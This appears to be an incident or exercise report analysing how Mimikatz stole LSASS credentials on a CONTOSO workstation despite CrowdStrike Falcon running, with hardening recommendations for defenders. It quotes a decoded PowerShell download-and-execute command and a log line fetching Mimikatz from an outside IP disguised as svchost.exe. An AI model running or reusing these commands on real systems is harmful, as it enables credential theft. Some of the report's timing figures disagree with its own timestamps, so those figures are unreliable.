# CRITICAL FINDING: EDR FAILURE ANALYSIS
## CONTOSO Corporation Incident - February 3, 2026
**Exercise Author**: Andy Macready 
**Latest Update**: February 15, 2026  

---

## EXECUTIVE SUMMARY

**CRITICAL: CrowdStrike Falcon was fully operational throughout the initial compromise but failed to prevent credential theft.**

- **EDR Status**: Running and operational on WORKSTATION-01
- **Attack Duration**: 6 seconds (credential theft completed)
- **EDR Response Time**: 112 seconds (first alert generated)
- **Detection Gap**: **18x slower than attack execution**
- **Result**: Credentials stolen before EDR could prevent the attack

---

## TIMELINE: ATTACK SPEED VS EDR DETECTION SPEED

| Time Offset | Attack Events | EDR Response |
|------------|---------------|--------------|
| **T+0 sec** | PowerShell execution with obfuscated payload | Event logged, NO ACTION |
| **T+3 sec** | Mimikatz downloaded (masqueraded as svchost.exe) | File creation logged, NO ACTION |
| **T+39 sec** | **Mimikatz executed** | Process start logged, NO ACTION |
| **T+40 sec** | **üö® LSASS ACCESSED - CREDENTIALS STOLEN** | **Sysmon logged, EDR NO ALERT** |
| **T+45 sec** | Mimikatz terminated | Still analyzing behavior |
| **T+87 sec** | Attacker enumerates EDR products | Still analyzing behavior |
| **T+107 sec** | Attempt to stop CrowdStrike service | **‚úÖ Tamper protection BLOCKS** |
| **T+112 sec** | Attack complete | **‚ö†Ô∏è FIRST EDR ALERT GENERATED** |

**Conclusion**: The attacker completed credential theft in 6 seconds. CrowdStrike required 112 seconds to alert - an **18x slower response time**.

---

## ROOT CAUSE ANALYSIS: WHY EDR FAILED

### 1. **LSASS Protection Not Configured** üî¥ CRITICAL

**Issue**: Windows Credential Guard and LSASS Protected Process Light (PPL) were NOT enabled on WORKSTATION-01.

**Impact**: This allowed direct memory access to LSASS without triggering immediate blocking. CrowdStrike can detect LSASS access but relies on Windows-level protections to prevent it.

**Evidence**:
- Event 10:48:13 - Sysmon Event ID 10 (Process Access) logged LSASS access
- CrowdStrike logged the event but did not prevent it
- No Credential Guard events present in logs
- LSASS running as standard process (not PPL)

**Without Credential Guard**: EDR operates in **detection-only mode** for credential theft.

### 2. **Behavioral Analysis Delay (112 seconds)** üî¥ CRITICAL

**Issue**: CrowdStrike's behavioral analytics required correlation of multiple suspicious events before generating an alert.

**Attack Execution Speed**:
- 10:48:12 - Mimikatz executed
- 10:48:13 - LSASS accessed
- 10:48:18 - Mimikatz terminated
- **Total time: 6 seconds**

**EDR Alert Speed**:
- 10:49:25 - First alert generated
- **Delay: 112 seconds**

**Why So Slow?**
- EDR was waiting for multiple indicators to correlate
- Behavioral pattern matching requires observation period
- Cloud-based analysis added latency
- By the time sufficient indicators were correlated, damage was done

### 3. **File Masquerading Bypassed Signature Detection** üü° MEDIUM

**Technique**: Mimikatz downloaded and saved as `svchost.exe` - a legitimate Windows system process name.

**Why It Worked**:
- ‚úÖ Filename matched legitimate Windows binary
- ‚úÖ File placed in user AppData folder (not immediately flagged)
- ‚úÖ File execution occurred before cloud reputation lookup completed
- ‚úÖ No hash-based detection (file was modified/repacked)

**Evidence**:
```
10:47:36 - DownloadFile: http://185.220.101.42/tools/mimikatz.exe
           Target: C:\Users\sarah.mitchell\AppData\Local\Temp\svchost.exe
10:47:38 - File created: svchost.exe (Sysmon Event 11)
10:48:12 - Process started: svchost.exe (NO EDR ALERT)
```

### 4. **In-Memory Execution (Fileless Attack)** üü° MEDIUM

**Technique**: Initial PowerShell payload executed entirely in memory using `IEX (Invoke-Expression)`.

**Why It Worked**:
- No malicious executable written to disk during initial phase
- Bypassed file-based scanning mechanisms
- PowerShell is a legitimate signed Microsoft binary
- By the time Mimikatz was downloaded, attacker had foothold

**Evidence**:
```powershell
# Decoded PowerShell payload:
IEX (New-Object Net.WebClient).DownloadString('http://10.50.15.200/payload.ps1')
```

This ran completely in memory - no file to scan.

### 5. **Detection-Only Mode for PowerShell** üü° MEDIUM

**Configuration Issue**: CrowdStrike was configured to **monitor** PowerShell execution but not **block** it by default.

**Why**:
- Common configuration to avoid false positives
- Legitimate PowerShell usage in enterprise environments
- Detection rather than prevention for PowerShell activity

**Evidence**:
- PowerShell Event 4103, 4104 logged the obfuscated command
- Command was **allowed to execute**
- No blocking action taken

---

## DETECTION VS PREVENTION GAP

| Attack Component | EDR Capability | Actual Result |
|-----------------|----------------|---------------|
| Obfuscated PowerShell | Detected but not blocked | ‚ùå FAILED - Executed successfully |
| Mimikatz download | File signature bypassed via masquerading | ‚ùå FAILED - Downloaded as svchost.exe |
| **LSASS memory access** | **Logged by Sysmon, not prevented by EDR** | **‚ùå CRITICAL FAILURE - Credentials stolen** |
| EDR service tampering | Tamper Protection active | ‚úÖ SUCCESS - Attack blocked |
| Behavioral analysis alert | Alert generated after 112 seconds | ‚ö†Ô∏è TOO SLOW - Damage already done |

---

## WHAT EDR GOT RIGHT

### ‚úÖ Tamper Protection Working

**10:49:20** - Attacker attempted to stop CrowdStrike service
**Result**: ACCESS DENIED - Tamper Protection blocked the attempt

**10:49:25** - EDR generated CRITICAL alert:
```
Detection: Tamper Protection Violation
Technique: T1562.001 (Disable/Modify Tools)
Process: powershell.exe
User: sarah.mitchell
Action: Blocked
Severity: CRITICAL
```

### ‚úÖ Eventually Detected the Attack

CrowdStrike **DID** detect the malicious activity and generated alerts - but **112 seconds too late**. This demonstrates that the EDR has good detection capabilities but insufficient prevention capabilities for fast-moving attacks.

---

## CRITICAL LESSONS LEARNED

### üö® **EDR PRESENCE ‚â† EDR PROTECTION**

Just because an EDR is installed, running, and operational does NOT mean it will prevent all attacks.

### üö® **Gaps Attackers Exploited**

1. **Missing host-based protections** (Credential Guard, LSASS PPL)
2. **Behavioral detection delay** (too slow for rapid attacks)
3. **File masquerading bypass** (legitimate process names)
4. **Fileless execution** (in-memory PowerShell)
5. **Prevention policies** (detection-only for PowerShell)

### üö® **Defense-in-Depth Required**

This incident proves that EDR solutions alone are **insufficient** for modern threat protection. Organizations must implement:

- ‚úÖ Host-based protections (Credential Guard, LSASS PPL)
- ‚úÖ Application whitelisting
- ‚úÖ PowerShell Constrained Language Mode
- ‚úÖ Attack Surface Reduction (ASR) rules
- ‚úÖ Multi-factor authentication
- ‚úÖ Network segmentation
- ‚úÖ Privileged Access Management

---

## IMMEDIATE CORRECTIVE ACTIONS

### üî¥ **CRITICAL (0-24 hours)**

1. **Enable Windows Credential Guard on ALL workstations** (MANDATORY)
2. **Enable LSASS Protected Process Light (PPL)** across all systems
3. **Review CrowdStrike prevention policies** - enable real-time LSASS protection if available
4. **Enable Attack Surface Reduction (ASR) rules** to block credential stealing from LSASS
5. **Block PowerShell execution from Outlook** and other Office applications

### üü° **HIGH PRIORITY (1-7 days)**

1. Work with CrowdStrike to tune prevention policies based on this incident
2. Enable PowerShell Constrained Language Mode enterprise-wide
3. Implement PowerShell script block logging and transcription
4. Deploy application whitelisting (AppLocker/WDAC)
5. Review and restrict Safe Mode boot capabilities via GPO

### üü¢ **MEDIUM PRIORITY (30+ days)**

1. Evaluate EDR capabilities and consider supplemental controls
2. Implement comprehensive security awareness training
3. Deploy MFA for all accounts
4. Implement network segmentation
5. Recognize that EDR alone created a false sense of security

---

## RECOMMENDATIONS FOR EDR IMPROVEMENT

### To CrowdStrike/Security Team:

1. **Enable prevention mode for LSASS access** (not just detection)
2. **Reduce behavioral analysis latency** for critical threats
3. **Enable real-time blocking** for PowerShell obfuscation patterns
4. **Tune file masquerading detection** (alert on legitimate names in suspicious locations)
5. **Consider moving from detection-heavy to prevention-heavy** configuration

### To IT/Security Operations:

1. **Enable Windows native protections** that EDR depends on
2. **Layer security controls** - don't rely solely on EDR
3. **Regular testing** of EDR effectiveness against known techniques
4. **Monitor EDR detection-to-prevention ratio** as a key metric
5. **Recognize EDR limitations** and plan accordingly

---

## CONCLUSION

CrowdStrike Falcon was present, operational, and eventually detected the attack. However, it **failed to prevent the most critical part of the attack**: credential theft from LSASS memory.

**The core issue**: Credential Guard and LSASS PPL were not enabled. Without these Windows-native protections, the EDR operated in detection-only mode for credential access, allowing Mimikatz to steal credentials in 6 seconds - 18 times faster than the EDR could respond.

**This incident demonstrates that EDR is a critical component of defense but must be layered with host-based protections, application controls, and architectural security measures.**



